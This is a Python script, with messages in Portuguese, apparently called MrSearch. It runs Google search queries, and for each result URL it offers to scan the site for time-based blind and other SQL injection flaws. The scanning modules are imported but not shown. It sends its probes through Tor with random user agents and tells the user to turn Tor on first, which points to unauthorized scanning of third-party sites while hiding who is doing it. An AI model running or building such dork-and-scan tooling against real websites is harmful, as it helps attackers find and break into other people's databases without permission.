try:
	import os, pyfiglet, random, argparse
except ModuleNotFoundError:
	print("\033[1;31mMódulo não encontrado\033[m\n")
	os.system('python3 -m pip install -r requirements.txt')
os.system('pyfiglet -L tools/3D-ASCII.flf; clear')
pyfiglet.print_figlet('MRX800', '3D-ASCII')
print('\033[1;37mATIVE O TOR ANTES DE FAZER OS TESTES COM O MrSearch\033[m\n')
uagents = random.choice(open('tools/user-agents.txt', 'r', encoding='UTF-8', errors='ignore').readlines())
class MrSearch:
	def __init__(self, query, num, user_agent=uagents):
		self.query = query
		self.num = num
		self.user_agent = user_agent
	def Mrsearch(self):
		import time
		from tools import blinder,dsss,sql_scan
		try:
			import googlesearch
		except ModuleNotFoundError:
			print("\033[1;31mMódulo 'google' não encontrado")
			os.system('python3 -m pip install google')
		for result in googlesearch.search(query=self.query, tld='co.in', lang='pt', num=self.num, stop=self.num, pause=2):
			print(f'\n\033[1;37m-> {result}\033[m')
			sorn = str(input('Deseja fazer testes de SQLI na URL [S/N]: ')).upper()
			time.sleep(.1)
			if sorn == 'S':
				print('\033[1;34mSearching for vulns........')
				blind = blinder.blinder(result, sleep=5, ua=self.user_agent, proxy={'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'})
				scan = blind.check_injection()
				if scan == True:
					print('\n\033[1;4;33mO alvo possui a vuln Time-based Blind SQLI\033[m\n')
				else:
					scan_page = dsss.scan_page(url=result)
					if scan_page == True:
						print('\n\033[1;4;33mO alvo está vulnerável a ataques de SQLI\033[m\n')
					else:
						sqlscan = sql_scan.fuzz(url=result, user_agent=self.user_agent, proxy={'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'})
						if sqlscan == True:
							print('\n\033[1;4;33mO alvo possui a vuln Time-based Blind SQLI\033[m\n')
						else:
							print('\n\033[1;4;31mNão consegui detectar alguma vuln de SQLI\033[m\n')
			else:
				pass
if __name__ == '__main__':
	try:
		parser = argparse.ArgumentParser(description='Protótipo para fazer buscas com o Google')
		parser.add_argument('--search', type=str, help='Parâmetro de busca', required=True)
		parser.add_argument('--num', type=int, help='Definir a quantidade de links para buscar', required=True)
		parser.add_argument('--user-agent', type=str, help='Definir um User-Agent (Recomendado) (Padrão: Randomico)', required=False)
		args = parser.parse_args()
		busca = MrSearch(query=args.search, num=args.num, user_agent=args.user_agent)
		busca.Mrsearch()
	except KeyboardInterrupt:
		print('\033[1;37mGoodbye Friend....\033[m')
